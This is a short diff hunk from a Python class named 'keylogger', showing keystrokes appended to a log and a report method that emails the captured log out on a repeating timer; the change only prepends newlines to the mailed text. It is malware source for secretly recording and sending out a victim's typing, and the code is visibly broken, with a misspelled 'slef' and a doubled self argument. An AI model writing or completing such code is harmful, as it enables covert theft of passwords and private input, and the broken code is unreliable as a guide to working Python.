@@ -26,7 +26,7 @@ class keylogger:
             slef.append_to_log(current_key)
     
     def report(self):
-        self.send_mail(self, self.email, slef.passwd, slef.log)
+        self.send_mail(self, self.email, slef.passwd, "\n\n" + slef.log)
         slef.log = ""
         timer = threading.Timer(slef.waittime, self.report)
 
